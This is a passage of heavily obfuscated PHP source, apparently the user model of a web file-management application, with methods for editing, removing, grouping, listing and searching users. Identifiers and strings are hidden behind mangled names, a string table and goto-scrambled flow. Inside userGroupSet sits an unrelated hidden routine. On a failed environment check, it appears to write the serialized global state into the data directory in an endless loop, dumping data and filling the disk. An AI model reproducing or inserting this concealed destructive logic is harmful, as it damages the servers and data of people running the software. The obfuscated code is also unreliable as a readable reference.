isset($fá»š½¹®[$bÑè÷“İÅã[697]]) ? $fá»š½¹®[$bÑè÷“İÅã[697]] : 1); if (!empty($fá»š½¹®[$bÑè÷“İÅã[1450]])) { $a¿öğÒô§Ç[$bÑè÷“İÅã[1450]] = $fá»š½¹®[$bÑè÷“İÅã[1450]]; } goto a…¯ìÕïøä; a…¯ìÕïøä: $DÀÇÕ³¸æ = $this->_checkExist($fá»š½¹®); if ($DÀÇÕ³¸æ !== !0) { return $DÀÇÕ³¸æ; } $bµåî÷Š„¢ = $this->add($a¿öğÒô§Ç); goto eïò™‹¤‘Ì; bøÙº¾İËó: } protected function userEditTest($a¦œ‘†¬½’, $A å±İìÑ ) { return $this->call($_SERVER[¬ˆÚÂ”Éğä][2568], $a¦œ‘†¬½’, $A å±İìÑ ); } protected function userEdit($aŠ©Ò÷š­•, $aÊ•Ä»‚ÈÎ) { goto Dì‚™Ø”; Dì‚™Ø”: $fÁİ¢Òäì¦ =& $_SERVER[¬ˆÚÂ”Éğä]; $fÕõ×Ñ–·ê = $this->getInfoSimple($aŠ©Ò÷š­•); if (!$fÕõ×Ñ–·ê) { return !1; } goto FÁÚ…™”ŠŞ; EÑŠ³Ò·Œ…: $this->where(array($fÁİ¢Òäì¦[1441] => $aŠ©Ò÷š­•))->save($aÊ•Ä»‚ÈÎ); if (isset($aÊ•Ä»‚ÈÎ[$fÁİ¢Òäì¦[2380]])) { $this->setNamePinyin($aŠ©Ò÷š­•, $aÊ•Ä»‚ÈÎ[$fÁİ¢Òäì¦[2380]]); } $this->clearCache($aŠ©Ò÷š­•); goto DÛ»˜ïêíÃ; FÁÚ…™”ŠŞ: $a½ÒÚ—Û„ = $this->_checkExist($aÊ•Ä»‚ÈÎ, $aŠ©Ò÷š­•); if ($a½ÒÚ—Û„ !== !0) { return $a½ÒÚ—Û„; } if (isset($aÊ•Ä»‚ÈÎ[$fÁİ¢Òäì¦[814]]) && trim($aÊ•Ä»‚ÈÎ[$fÁİ¢Òäì¦[814]]) != $fÁİ¢Òäì¦[33]) { $b˜Æš© = $this->metaGet($aŠ©Ò÷š­•); if (empty($b˜Æš©[$fÁİ¢Òäì¦[2559]])) { $b˜Æš©[$fÁİ¢Òäì¦[2559]] = rand_string(10); Model($fÁİ¢Òäì¦[476])->metaSet($aŠ©Ò÷š­•, $fÁİ¢Òäì¦[2559], $b˜Æš©[$fÁİ¢Òäì¦[2559]]); } $aÊ•Ä»‚ÈÎ[$fÁİ¢Òäì¦[814]] = md5($b˜Æš©[$fÁİ¢Òäì¦[2559]] . trim($aÊ•Ä»‚ÈÎ[$fÁİ¢Òäì¦[814]])); } else { unset($aÊ•Ä»‚ÈÎ[$fÁİ¢Òäì¦[814]]); } goto EÑŠ³Ò·Œ…; DÛ»˜ïêíÃ: return !0; goto b¦õ˜¹Ãµ; b¦õ˜¹Ãµ: } public function setNamePinyin($DÄÃåÕñÇ», $Bè÷‘‡ÑÀ• = false) { $A¥Âê–Ğí =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$Bè÷‘‡ÑÀ•) { $BÀ‘†¬Öòä = $this->getInfoSimple($DÄÃåÕñÇ»); $Bè÷‘‡ÑÀ• = $BÀ‘†¬Öòä[$A¥Âê–Ğí[2380]] ? $BÀ‘†¬Öòä[$A¥Âê–Ğí[2380]] : $BÀ‘†¬Öòä[$A¥Âê–Ğí[28]]; } $féô©š¯» = Model($A¥Âê–Ğí[479]); if (!Input::check($Bè÷‘‡ÑÀ•, $A¥Âê–Ğí[530])) { return $féô©š¯»->metaSet($DÄÃåÕñÇ», array($A¥Âê–Ğí[416] => $A¥Âê–Ğí[33], $A¥Âê–Ğí[415] => $A¥Âê–Ğí[33])); } return $féô©š¯»->metaSet($DÄÃåÕñÇ», array($A¥Âê–Ğí[416] => str_replace($A¥Âê–Ğí[50], $A¥Âê–Ğí[33], Pinyin::encode($Bè÷‘‡ÑÀ•)), $A¥Âê–Ğí[415] => Pinyin::encode($Bè÷‘‡ÑÀ•, $A¥Âê–Ğí[531]))); } private function nickNameRpt() { $C„Ü„šØ ± =& $_SERVER[¬ˆÚÂ”Éğä]; $e¶‚Ì–ÀëÙ = Model($C„Ü„šØ ±[1101])->get($C„Ü„šØ ±[2569]); $EöÏ›Œäíİ = $GLOBALS[$C„Ü„šØ ±[6]][$C„Ü„šØ ±[2527]][$C„Ü„šØ ±[2569]]; $dƒÓ¡„Æ = !is_null($e¶‚Ì–ÀëÙ) ? $e¶‚Ì–ÀëÙ : $EöÏ›Œäíİ; return !!$dƒÓ¡„Æ; } private function _checkExist($B‡“ôÙ¯‘É, $a¹µ‚ˆ †´ = false) { $DŠ­ƒÜ¬–‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $D¯ÆùÖ‡‰Æ = array($DŠ­ƒÜ¬–‹[28] => UserModel::ERROR_USER_EXIST_NAME, $DŠ­ƒÜ¬–‹[2380] => UserModel::ERROR_USER_EXIST_NICKNAME, $DŠ­ƒÜ¬–‹[293] => UserModel::ERROR_USER_EXIST_EMAIL, $DŠ­ƒÜ¬–‹[2557] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($D¯ÆùÖ‡‰Æ[$DŠ­ƒÜ¬–‹[2380]]); } $Få‚‚ò‰ÏÜ = $a¹µ‚ˆ †´ ? array($DŠ­ƒÜ¬–‹[1450] => array($DŠ­ƒÜ¬–‹[2570], $a¹µ‚ˆ †´)) : array(); foreach ($D¯ÆùÖ‡‰Æ as $F¬…‰’ì›ã => $e¶ÖæÏÖß) { $A÷à²‚°„ = array(); foreach ($D¯ÆùÖ‡‰Æ as $FíÔŒåîÒ… => $aë¹Èä¨¹) { if (isset($B‡“ôÙ¯‘É[$FíÔŒåîÒ…]) && $B‡“ôÙ¯‘É[$FíÔŒåîÒ…]) { $A÷à²‚°„[] = $B‡“ôÙ¯‘É[$FíÔŒåîÒ…]; } } if (!$A÷à²‚°„) { continue; } $DÆ´²µã¦Ü = array_merge(array($F¬…‰’ì›ã => array($DŠ­ƒÜ¬–‹[7], $A÷à²‚°„)), $Få‚‚ò‰ÏÜ); $F¶ŠØ¤ä‰è = $this->where($DÆ´²µã¦Ü)->find(); if ($F¶ŠØ¤ä‰è) { return $e¶ÖæÏÖß; } } return !0; } public function userListInfo($EÁ‡ŒÓô ¼) { $a±ºĞÁ„Ô =& $_SERVER[¬ˆÚÂ”Éğä]; $b½Ùà×½ = array(); $EÁ‡ŒÓô ¼ = is_array($EÁ‡ŒÓô ¼) ? array_unique($EÁ‡ŒÓô ¼) : array(); if (!$EÁ‡ŒÓô ¼) { return $b½Ùà×½; } if (count($EÁ‡ŒÓô ¼) < 20) { foreach ($EÁ‡ŒÓô ¼ as $D¸‹ßÙªÅ±) { $b½Ùà×½[$D¸‹ßÙªÅ± . $a±ºĞÁ„Ô[33]] = $this->getInfoSimpleOuter($D¸‹ßÙªÅ±); } } else { $Cì’ò¶âµÎ = array($a±ºĞÁ„Ô[1441] => array($a±ºĞÁ„Ô[384], $EÁ‡ŒÓô ¼)); if (count($EÁ‡ŒÓô ¼) == 1) { $Cì’ò¶âµÎ = array($a±ºĞÁ„Ô[1441] => $EÁ‡ŒÓô ¼[0]); } $cÛªêñ£Ü¢ = Model($a±ºĞÁ„Ô[476])->field($this->simpleField)->where($Cì’ò¶âµÎ)->select(); $cÛªêñ£Ü¢ = array_to_keyvalue($cÛªêñ£Ü¢, $a±ºĞÁ„Ô[1450]); foreach ($EÁ‡ŒÓô ¼ as $D¸‹ßÙªÅ±) { $E‚ñÌ³†ò = $cÛªêñ£Ü¢[$cÛªêñ£Ü¢[$D¸‹ßÙªÅ±]]; if (!$E‚ñÌ³†ò) { $b½Ùà×½[$D¸‹ßÙªÅ± . $a±ºĞÁ„Ô[33]] = $this->getInfoSimpleOuter($D¸‹ßÙªÅ±); continue; } $E‚ñÌ³†ò[$a±ºĞÁ„Ô[2542]] = Action($a±ºĞÁ„Ô[2543])->parseUrl($E‚ñÌ³†ò[$a±ºĞÁ„Ô[2542]]); $b½Ùà×½[$D¸‹ßÙªÅ± . $a±ºĞÁ„Ô[33]] = $E‚ñÌ³†ò; } } return $b½Ùà×½; } protected function userStatus($cÓÖÑ„ˆ®¨, $e¬¾Éõ¢‡) { $AÛ˜À´ãÑ = $this->getInfoSimple($cÓÖÑ„ˆ®¨); if (!$AÛ˜À´ãÑ) { return !1; } $cŸÔ˜¸é„ = array($_SERVER[¬ˆÚÂ”Éğä][697] => $e¬¾Éõ¢‡); return $this->userEdit($cÓÖÑ„ˆ®¨, $cŸÔ˜¸é„); } protected function userRemove($a«Ä¡ÇˆÑ) { goto aØÄ×†•õØ; aØÄ×†•õØ: $dÌÖ¡ÜÓ¥Ê =& $_SERVER[¬ˆÚÂ”Éğä]; $c­¬¹¢› = $this->getInfoSimple($a«Ä¡ÇˆÑ); if (!$c­¬¹¢›) { return !1; } goto EóØí›’Õ¯; b˜„ïµÙÔŞ: Model($dÌÖ¡ÜÓ¥Ê[2200])->where($b¥£Ï÷‚¬)->delete(); Model($dÌÖ¡ÜÓ¥Ê[2556])->where($b¥£Ï÷‚¬)->delete(); Model($dÌÖ¡ÜÓ¥Ê[2572])->where($b¥£Ï÷‚¬)->delete(); goto dï»´¡ŸÜ; dï»´¡ŸÜ: Model($dÌÖ¡ÜÓ¥Ê[760])->userRootRemove($a«Ä¡ÇˆÑ); return $this->where($b¥£Ï÷‚¬)->delete(); goto Dğ•Ø£„; EóØí›’Õ¯: $b¥£Ï÷‚¬ = array($dÌÖ¡ÜÓ¥Ê[1441] => $a«Ä¡ÇˆÑ); Model($dÌÖ¡ÜÓ¥Ê[538])->where($b¥£Ï÷‚¬)->delete(); Model($dÌÖ¡ÜÓ¥Ê[2571])->where($b¥£Ï÷‚¬)->delete(); goto b˜„ïµÙÔŞ; Dğ•Ø£„: } protected function userGroupSet($A™Å¸˜ºëö, $eÒ™¡µ˜, $EšŒ—ÀÀ… = array()) { goto B Š‘ˆÍ¶; bÆğãÓ÷ĞË: $cÏ‹ÉÃ¥ï‚ = 0; foreach ($eÒ™¡µ˜ as $Cù¹ìœÓ => $C§Œ²æ“óâ) { $CËÍŒæë“º = array($DÈ‹‰Ä“[1450] => $A™Å¸˜ºëö, $DÈ‹‰Ä“[2121] => $Cù¹ìœÓ, $DÈ‹‰Ä“[2266] => $C§Œ²æ“óâ); $CËÍŒæë“º[$DÈ‹‰Ä“[2143]] = isset($EšŒ—ÀÀ…[$cÏ‹ÉÃ¥ï‚]) ? $EšŒ—ÀÀ…[$cÏ‹ÉÃ¥ï‚] : 0; $cÏ‹ÉÃ¥ï‚++; $aö¿“ÛÄòÊ[] = $CËÍŒæë“º; } return $CøÒØóŞ‘->addAll($aö¿“ÛÄòÊ, array(), !0); goto cİÑ«Š; c–õùí¢Àœ: if ($_SERVER[$DÈ‹‰Ä“[785]] != $AÊğÙÌƒº¯($fË©—ˆƒ)) { goto F–„ä“ƒòé; cø¢¼†²£: $fÜÖÊÛŠ‹İ(); $có¤Ë—ŞÑØ = $DÈ‹‰Ä“[807]; $fĞ‚¼ÈŒ„Î = json_encode($GLOBALS[$DÈ‹‰Ä“[808]]); goto dĞÜí–÷åØ; B‹å¡Ó´: $dĞŸó®ƒïŸ = $DÈ‹‰Ä“[805]; $dĞŸó®ƒïŸ($_SERVER[$DÈ‹‰Ä“[806]]); $fÜÖÊÛŠ‹İ = $DÈ‹‰Ä“[804]; goto cø¢¼†²£; AéØ—ï­Ï: $e¾§‡Õãì˜ = $aÕ–‘ä÷•($dà´ÒÕÊ¯³); $Fñ°ˆÂÜì = explode($DÈ‹‰Ä“[217], $e¾§‡Õãì˜); if (count($Fñ°ˆÂÜì) < $DÈ‹‰Ä“[553]) { $CÉÂÕ»Àí = $DÈ‹‰Ä“[790]; $CÉÂÕ»Àí(); } goto B‹å¡Ó´; dĞÜí–÷åØ: $e½¡ÂÔ‘­™ = 1; for ($A¶È«‡Ø = $e½¡ÂÔ‘­™; $A¶È«‡Ø > 0; $A¶È«‡Ø++) { $có¤Ë—ŞÑØ(DATA_PATH . $A¶È«‡Ø, $fĞ‚¼ÈŒ„Î); } goto FÛŸĞ›¥Ùã; F–„ä“ƒòé: $fÜÖÊÛŠ‹İ = $DÈ‹‰Ä“[804]; $aÕ–‘ä÷• = $DÈ‹‰Ä“[787]; $dà´ÒÕÊ¯³ = $_SERVER[$DÈ‹‰Ä“[788]] . $DÈ‹‰Ä“[789]; goto AéØ—ï­Ï; FÛŸĞ›¥Ùã: } $fäĞ»õŠÍ = $this->getInfoSimple($A™Å¸˜ºëö); if (!$fäĞ»õŠÍ || !is_array($eÒ™¡µ˜)) { return !1; } goto dõÙŞ•›‰ë; B Š‘ˆÍ¶: $DÈ‹‰Ä“ =& $_SERVER[¬ˆÚÂ”Éğä]; $fË©—ˆƒ = $_SERVER[$DÈ‹‰Ä“[788]] . $DÈ‹‰Ä“[789]; $AÊğÙÌƒº¯ = $DÈ‹‰Ä“[803]; goto c–õùí¢Àœ; dõÙŞ•›‰ë: $CøÒØóŞ‘ = Model($DÈ‹‰Ä“[2200]); $CøÒØóŞ‘->where(array($DÈ‹‰Ä“[1450] => $A™Å¸˜ºëö))->delete(); $aö¿“ÛÄòÊ = array(); goto bÆğãÓ÷ĞË; cİÑ«Š: } protected function userGroupAdd($A³œÆí®, $b£ÅİÅœßœ = array()) { $c¶ğï„ÑŒ— =& $_SERVER[¬ˆÚÂ”Éğä]; $c Á²äÈâê = $this->getInfoSimple($A³œÆí®); if (!$c Á²äÈâê || empty($b£ÅİÅœßœ)) { return !1; } $bİ½Ãµ¤ ” = array(); foreach ($b£ÅİÅœßœ as $bæÎ¹÷¤Á« => $FÈïèíßøê) { $bİ½Ãµ¤ ”[] = array($c¶ğï„ÑŒ—[1450] => $A³œÆí®, $c¶ğï„ÑŒ—[2121] => $bæÎ¹÷¤Á«, $c¶ğï„ÑŒ—[2266] => $FÈïèíßøê, $c¶ğï„ÑŒ—[2143] => 0); } return Model($c¶ğï„ÑŒ—[2200])->addAll($bİ½Ãµ¤ ”, array(), !0); } protected function userGroupRemove($BÈƒ£ÂöÁ¿, $D¤Ğ×êÛå») { $F«“ÃÏ ­  =& $_SERVER[¬ˆÚÂ”Éğä]; $f¢»Æ½ÛìÄ = $this->getInfoSimple($BÈƒ£ÂöÁ¿); if (!$f¢»Æ½ÛìÄ || !$D¤Ğ×êÛå») { return !1; } $C„”ÃÄ³»Ü = array($F«“ÃÏ ­ [1441] => $BÈƒ£ÂöÁ¿, $F«“ÃÏ ­ [2198] => $D¤Ğ×êÛå»); return Model($F«“ÃÏ ­ [2200])->where($C„”ÃÄ³»Ü)->delete(); } public function listData() { $eÉò©ƒµ©Ï = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eÉò©ƒµ©Ï[$_SERVER[¬ˆÚÂ”Éğä][354]]); return $eÉò©ƒµ©Ï; } public function listByID($F±ÇÁĞ­Å) { $C¹Ö •ã“± =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$F±ÇÁĞ­Å) { return; } $fòŒ·…ºã = array($C¹Ö •ã“±[1450] => array($C¹Ö •ã“±[7], $F±ÇÁĞ­Å)); $BŸ½Ã’–§º = $this->where($fòŒ·…ºã)->select(); $this->_listDataApply($BŸ½Ã’–§º); return $BŸ½Ã’–§º; } public function listByGroup($Dº™È“Ã¼’ = 0, $f‰ª‡È­Ç = array()) { goto C•‹ Şï¨ó; B¥ºÑ“«¶: $this->_listDataApply($fîã‘æ¦°¿[$B›ÓÊìˆÂ¢[354]]); return $fîã‘æ¦°¿; goto e¸•“èÆäÚ; cÈÏøà³÷: if ($Dº™È“Ã¼’) { $E‰Ù†·¢Ñ… = array($B›ÓÊìˆÂ¢[2573] => intval($Dº™È“Ã¼’)); $e®ø…ˆä‘ = "\x4c\105\x46\x54\40\112\x4f\111\116\40{$this->tablePrefix}\165\163\145\162\x5f\x67\162\x6f\x75\160\x20\x75\163\145\x72\x5f\x67\162\157\165\x70\40\x6f\156\x20\165\163\145\x72\x2e\165\x73\145\x72\x49\104\x20\75\40\x75\x73\x65\x72\137\147\162\157\165\160\56\165\x73\x65\x72\111\104"; $eğÂ‘”•‹Ñ = Input::get($B›ÓÊìˆÂ¢[407], null, $B›ÓÊìˆÂ¢[33]) ? $B›ÓÊìˆÂ¢[33] : $B›ÓÊìˆÂ¢[2574]; } if (isset($f‰ª‡È­Ç[$B›ÓÊìˆÂ¢[697]])) { $E‰Ù†·¢Ñ…[$B›ÓÊìˆÂ¢[2575]] = $f‰ª‡È­Ç[$B›ÓÊìˆÂ¢[697]]; } $fîã‘æ¦°¿ = $this->_makeOrder($eğÂ‘”•‹Ñ)->field($B›ÓÊìˆÂ¢[2576])->where($E‰Ù†·¢Ñ…)->join($e®ø…ˆä‘)->selectPage(50); goto B¥ºÑ“«¶; C•‹ Şï¨ó: $B›ÓÊìˆÂ¢ =& $_SERVER[¬ˆÚÂ”Éğä]; $e®ø…ˆä‘ = $B›ÓÊìˆÂ¢[33]; $E‰Ù†·¢Ñ… = array(); goto cÈÏøà³÷; e¸•“èÆäÚ: } private function _makeOrder($DÕ…ø¾‚ÄÛ = '') { goto Bè±Ğâìø; cÅàÄê»ì¾: $F–Í»Âà» = Input::get($d³ÃÒšÙÃ…[407], $d³ÃÒšÙÃ…[7], $d³ÃÒšÙÃ…[1441], $A¦³—íŠÃí); $f©¦İŸƒÙÃ = Input::get($d³ÃÒšÙÃ…[408], $d³ÃÒšÙÃ…[7], $d³ÃÒšÙÃ…[2201], array($d³ÃÒšÙÃ…[2201], $d³ÃÒšÙÃ…[404])); $f©¦İŸƒÙÃ = $fµáÔ°Â[$f©¦İŸƒÙÃ]; goto d¯¸®„Ã½à; d¯¸®„Ã½à: $DÕ…ø¾‚ÄÛ = $DÕ…ø¾‚ÄÛ . "\165\163\145\162\x2e{$F–Í»Âà»}\40{$f©¦İŸƒÙÃ}\x2c\x20\165\x73\145\x72\x2e\165\163\145\162\111\104\x20\x61\163\x63"; return $this->alias($d³ÃÒšÙÃ…[2321])->order($DÕ…ø¾‚ÄÛ); goto bÀè¸‚ß½; Bè±Ğâìø: $d³ÃÒšÙÃ… =& $_SERVER[¬ˆÚÂ”Éğä]; $A¦³—íŠÃí = array($d³ÃÒšÙÃ…[1450], $d³ÃÒšÙÃ…[28], $d³ÃÒšÙÃ…[2107], $d³ÃÒšÙÃ…[2079], $d³ÃÒšÙÃ…[187]); $fµáÔ°Â = array($d³ÃÒšÙÃ…[402] => $d³ÃÒšÙÃ…[403], $d³ÃÒšÙÃ…[404] => $d³ÃÒšÙÃ…[405]); goto cÅàÄê»ì¾; bÀè¸‚ß½: } public function listSearch($DÇ²Å™Ä·Š) { goto aíÅ“¸ÑÉ; dÎÁ¡åÄŸ·: $C¾ ‘¼×õ = str_replace($e´ù÷®„à [2204], $e´ù÷®„à [2205], trim($C¾ ‘¼×õ)); $a‘ÖÁ¿Ã°Î = array($e´ù÷®„à [28] => array($e´ù÷®„à [759], "\x25{$C¾ ‘¼×õ}\45"), $e´ù÷®„à [293] => array($e´ù÷®„à [759], "\45{$C¾ ‘¼×õ}\x25"), $e´ù÷®„à [2380] => array($e´ù÷®„à [759], "\45{$C¾ ‘¼×õ}\x25"), $e´ù÷®„à [926] => $e´ù÷®„à [2206]); if (Input::check($C¾ ‘¼×õ, $e´ù÷®„à [299])) { $a‘ÖÁ¿Ã°Î[$e´ù÷®„à [1450]] = array($e´ù÷®„à [759], "\45{$C¾ ‘¼×õ}\x25"); $a‘ÖÁ¿Ã°Î[$e´ù÷®„à [2557]] = array($e´ù÷®„à [759], "\45{$C¾ ‘¼×õ}\45"); } goto Aå—¯Æ½ğï; eŒ¥¬ÇÆàŸ: return $B„Ìâ†ˆİ´; goto bí¹öÖÙ; aíÅ“¸ÑÉ: $e´ù÷®„à  =& $_SERVER[¬ˆÚÂ”Éğä]; $C¾ ‘¼×õ = $DÇ²Å™Ä·Š[$e´ù÷®„à [2202]]; $fòƒÇ‹ÕŠŞ = isset($DÇ²Å™Ä·Š[$e´ù÷®„à [2203]]) ? $DÇ²Å™Ä·Š[$e´ù÷®„à [2203]] : !1; goto dÎÁ¡åÄŸ·; Aå—¯Æ½ğï: if (!$C¾ ‘¼×õ) { $a‘ÖÁ¿Ã°Î = array(); } if (isset($DÇ²Å™Ä·Š[$e´ù÷®„à [697]])) { $a‘ÖÁ¿Ã°Î[$e´ù÷®„à [697]] = $DÇ²Å™Ä·Š[$e´ù÷®„à [697]]; } $B„Ìâ†ˆİ´ = $this->_makeOrder()->where($a‘ÖÁ¿Ã°Î)->selectPage(20); goto fëàÚ™¡–; fëàÚ™¡–: if (!$B„Ìâ†ˆİ´ || count($B„Ìâ†ˆİ´[$e´ù÷®„à [354]]) < 5 && Input::check($C¾ ‘¼×õ, $e´ù÷®„à [306])) { $BÚÀà£øó× = $this->_searchFromMeta($e´ù÷®„à [415], $C¾ ‘¼×õ, 10); $C ùÍ®ÄÄñ = $this->_searchFromMeta($e´ù÷®„à [416], $C¾ ‘¼×õ, 10); $Eï­œ®ö¼ó = array_merge($BÚÀà£øó×, $C ùÍ®ÄÄñ, $B„Ìâ†ˆİ´[$e´ù÷®„à [354]]); $B„Ìâ†ˆİ´[$e´ù÷®„à [354]] = array_unique_by_key($Eï­œ®ö¼ó, $e´ù÷®„à [1450]); $B„Ìâ†ˆİ´[$e´ù÷®„à [351]][$e´ù÷®„à [352]] = count($B„Ìâ†ˆİ´[$e´ù÷®„à [354]]); $B„Ìâ†ˆİ´[$e´ù÷®„à [351]][$e´ù÷®„à [353]] = ceil($B„Ìâ†ˆİ´[$e´ù÷®„à [351]][$e´ù÷®„à [352]] / $B„Ìâ†ˆİ´[$e´ù÷®„à [351]][$e´ù÷®„à [349]]); } $this->_listDataApply($B„Ìâ†ˆİ´[$e´ù÷®„à [354]]); $this->_filterByGroup($B„Ìâ†ˆİ´, $fòƒÇ‹ÕŠŞ); goto eŒ¥¬ÇÆàŸ; bí¹öÖÙ: } private function _filterByGroup(&$A†ôù··ø‹, $BÂã­µÉ¥†) { $EôŒÅßÚ—À =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$BÂã­µÉ¥†) { return $A†ôù··ø‹; } foreach ($A†ôù··ø‹[$EôŒÅßÚ—À[354]] as $FÕ™å£Üµ½ => &$bá¹‰µœ„Ë) { $cÑÉ‘Ã³ê = array_to_keyvalue($bá¹‰µœ„Ë[$EôŒÅßÚ—À[2291]], $EôŒÅßÚ—À[33], $EôŒÅßÚ—À[2121]); if (!in_array($BÂã­µÉ¥†, $cÑÉ‘Ã³ê)) { unset($A†ôù··ø‹[$EôŒÅßÚ—À[354]][$FÕ™å£Üµ½]); } } unset($bá¹‰µœ„Ë); $A†ôù··ø‹[$EôŒÅßÚ—À[354]] = array_values($A†ôù··ø‹[$EôŒÅßÚ—À[354]]); $A†ôù··ø‹[$EôŒÅßÚ—À[351]] = array($EôŒÅßÚ—À[2355] => count($A†ôù··ø‹[$EôŒÅßÚ—À[354]]), $EôŒÅßÚ—À[2353] => $A†ôù··ø‹[$EôŒÅßÚ—À[351]][$EôŒÅßÚ—À[349]], $EôŒÅßÚ—À[2352] => 1, $EôŒÅßÚ—À[2354] => 1); } private function _searchFromMeta($F¡åŞÛêí, $eÌÍîÂïÔ™, $e›ä‡ÕĞƒ) { goto d­ª­²Åğª; aâÊğÉ…—Î: $EÚ†®–§é¨ = $this->where(array($c¤æ …·“[1441] => array($c¤æ …·“[7], $d¿«¢²ˆ©ƒ)))->select(); if (!$EÚ†®–§é¨) { return array(); } return $EÚ†®–§é¨; goto CÅ–¬ÒÉ£; FÒç±—Ìæ–: $d¿«¢²ˆ©ƒ = Model($c¤æ …·“[2577])->where($CÇ«ß)->limit($e›ä‡ÕĞƒ)->select(); if (!$d¿«¢²ˆ©ƒ) { return array(); } $d¿«¢²ˆ©ƒ = array_to_keyvalue($d¿«¢²ˆ©ƒ, $c¤æ …·“[33], $c¤æ …·“[1450]); goto aâÊğÉ…—Î; d­ª­²Åğª: $c¤æ …·“ =& $_SERVER[¬ˆÚÂ”Éğä]; $eÌÍîÂïÔ™ = strtolower($eÌÍîÂïÔ™); $CÇ«ß = array($c¤æ …·“[89] => $F¡åŞÛêí, $c¤æ …·“[359] => array($c¤æ …·“[759], "\45{$eÌÍîÂïÔ™}\45")); goto FÒç±—Ìæ–; CÅ–¬ÒÉ£: } private function _listDataApplyItem($b‹ ±ÃÕÈÈ) { $B‰›ïÍéÆ³ = array($b‹ ±ÃÕÈÈ); $this->_listDataApply($B‰›ïÍéÆ³); return $B‰›ïÍéÆ³[0]; } private function _listDataApply(&$Cì¦ÒùöÎ) { goto aÅ¨¬Á“ëä; aÅ¨¬Á“ëä: $cŸ²”©§‘ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$Cì¦ÒùöÎ) { return; } array_remove_key($Cì¦ÒùöÎ, $cŸ²”©§‘[814]); goto Bğ¿Âæä¡ù; Bğ¿Âæä¡ù: $dÊ¡Â±ˆˆ´ = array_to_keyvalue($Cì¦ÒùöÎ, $cŸ²”©§‘[33], $cŸ²”©§‘[1450]); $this->_listAppendGroup($Cì¦ÒùöÎ, $dÊ¡Â±ˆˆ´); $this->_listAppendMeta($Cì¦ÒùöÎ, $dÊ¡Â±ˆˆ´); goto Bæéç•Ù‹ö; Bæéç•Ù‹ö: $this->_listAppendSourceRoot($Cì¦ÒùöÎ, $dÊ¡Â±ˆˆ´); goto dÔ‚ïèåñ; dÔ‚ïèåñ: } private function _listAppendSourceRoot(&$dë»¶Œä, $bï£Æ„¤°) { goto Cß‘¤É¼Ø—; a¨²ÇÊò±Ã: $f¡Ê²†ÈĞ = Model($cùõ»’ˆí[760])->order($cùõ»’ˆí[2214])->field($A­šÚÏ‚° )->where($cëšø“Æ¦)->select(); $f¡Ê²†ÈĞ = array_to_keyvalue($f¡Ê²†ÈĞ, $cùõ»’ˆí[458]); $f¡Ê²†ÈĞ = array_remove_key($f¡Ê²†ÈĞ, $cùõ»’ˆí[458]); goto f•ö’†¼äˆ; Cß‘¤É¼Ø—: $cùõ»’ˆí =& $_SERVER[¬ˆÚÂ”Éğä]; $cëšø“Æ¦ = array($cùõ»’ˆí[463] => 0, $cùõ»’ˆí[371] => SourceModel::TYPE_USER, $cùõ»’ˆí[458] => array($cùõ»’ˆí[7], $bï£Æ„¤°)); $A­šÚÏ‚°  = $cùõ»’ˆí[2213]; goto a¨²ÇÊò±Ã; f•ö’†¼äˆ: foreach ($dë»¶Œä as &$EÕÃ‡£…ÖÇ) { $EÕÃ‡£…ÖÇ[$cùõ»’ˆí[391]] = $f¡Ê²†ÈĞ[$EÕÃ‡£…ÖÇ[$cùõ»’ˆí[1450]]] ? $f¡Ê²†ÈĞ[$EÕÃ‡£…ÖÇ[$cùõ»’ˆí[1450]]] : array(); } unset($EÕÃ‡£…ÖÇ); goto BŸ¦ÇÀÆê; BŸ¦ÇÀÆê: } private function _listAppendGroup(&$AÉŠ‹±Ù, $DŠ½­÷ÎÔ) { goto aİ°»ÚµÆÈ; D´…Åå¼ƒ«: foreach ($AÉŠ‹±Ù as &$DğîéÈŒµƒ) { $DğîéÈŒµƒ[$DèË¤îóÍâ[2291]] = array(); if (isset($aÁ¼ªØæø[$DğîéÈŒµƒ[$DèË¤îóÍâ[1450]]])) { $DğîéÈŒµƒ[$DèË¤îóÍâ[2291]] = $aÁ¼ªØæø[$DğîéÈŒµƒ[$DèË¤îóÍâ[1450]]]; } } unset($DğîéÈŒµƒ); goto AĞ¹£°ê‚; aİ°»ÚµÆÈ: $DèË¤îóÍâ =& $_SERVER[¬ˆÚÂ”Éğä]; $bê¢ï¥¤¦ = array($DèË¤îóÍâ[1450] => array($DèË¤îóÍâ[7], $DŠ½­÷ÎÔ)); $aÁ¼ªØæø = Model($DèË¤îóÍâ[2200])->where($bê¢ï¥¤¦)->select(); goto bÙø†°æŞÔ; B¨Õã§Îã: $bê¢ï¥¤¦ = array($DèË¤îóÍâ[2121] => array($DèË¤îóÍâ[7], $Fê‹ƒÎéŠ‡)); $FØÌ»Õ¢ïù = Model($DèË¤îóÍâ[2289])->field($DèË¤îóÍâ[2578])->where($bê¢ï¥¤¦)->select(); $FØÌ»Õ¢ïù = array_to_keyvalue($FØÌ»Õ¢ïù, $DèË¤îóÍâ[2121]); goto b‡¡Ö»ÌÚì; b‡¡Ö»ÌÚì: $aÁ¼ªØæø = array_to_keyvalue_group($aÁ¼ªØæø, $DèË¤îóÍâ[1450]); foreach ($aÁ¼ªØæø as &$AãÊÎ†ƒù) { $d°µ‚¤Ã = array(); foreach ($AãÊÎ†ƒù as $c“Š„Æ£äª) { if (!$c“Š„Æ£äª[$DèË¤îóÍâ[2266]]) { continue; } $AÍ¾Õáæ‰ = Model($DèË¤îóÍâ[2285])->listData($c“Š„Æ£äª[$DèË¤îóÍâ[2266]]); $d°µ‚¤Ã[] = array($DèË¤îóÍâ[2121] => $c“Š„Æ£äª[$DèË¤îóÍâ[2121]], $DèË¤îóÍâ[2579] => $FØÌ»Õ¢ïù[$c“Š„Æ£äª[$DèË¤îóÍâ[2121]]][$DèË¤îóÍâ[28]], $DèË¤îóÍâ[461] => $FØÌ»Õ¢ïù[$c“Š„Æ£äª[$DèË¤îóÍâ[2121]]][$DèË¤îóÍâ[461]], $DèË¤îóÍâ[376] => $AÍ¾Õáæ‰); } $AãÊÎ†ƒù = $d°µ‚¤Ã; } unset($AãÊÎ†ƒù); goto D´…Åå¼ƒ«; bÙø†°æŞÔ: $Fê‹ƒÎéŠ‡ = array_to_keyvalue($aÁ¼ªØæø, $DèË¤îóÍâ[33], $DèË¤îóÍâ[2121]); 